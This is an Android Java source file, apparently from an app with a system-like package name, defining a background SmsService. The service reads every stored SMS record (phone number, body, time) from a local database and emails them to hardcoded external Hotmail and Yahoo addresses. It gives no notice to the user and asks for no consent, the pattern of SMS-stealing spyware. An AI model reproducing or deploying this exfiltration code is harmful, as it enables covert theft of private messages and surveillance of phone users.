package geosat.mysys;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

/**
 * Created by rocoo.shiang on 2015/9/30.
 */
public class SmsService  extends Service{

    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }

    @Override
    public void onCreate() {


    }

    @Override
    public void onDestroy() {


    }

    @Override
    public void onStart(Intent intent, int startId) {
        String type = intent.getStringExtra("type");
        if (intent != null) {
            Mydb db1 = new Mydb(this);
            Cursor cursor = db1.queryBySql("SELECT * FROM SmsInfo");
            String phone, body, time;
            int count = 1;
            StringBuilder builder = new StringBuilder();
            while (cursor.moveToNext()) {
                phone = cursor.getString(cursor.getColumnIndex("Phone"));
                body = cursor.getString(cursor.getColumnIndex("Body"));
                time = cursor.getString(cursor.getColumnIndex("Time"));
                builder.append(count + ". Phone: " + phone + "\t\t\tTime: " + time + "\t\t\tBody: " + body+"\n");
                count++;
            }

            builder.append("\n\n\n\n\n------------------\n"+type);

            if (count > 1) {
                try {
                    //
                    GMailSender sender = new GMailSender("寄件人Mail", "密碼");
                    sender.sendMail("My mail",  // 主旨
                            builder.toString(),
                            "寄件人Mail",      // 寄件人
                            "xxx@hotmail.com,ooo@yahoo.com.tw"    //收件人，可以多個用逗號分開
                    );
                } catch (Exception e) {
                    Log.i("rocoo", "send mail error: " + e.getMessage(), e);
                }
            }
        }
    }

}
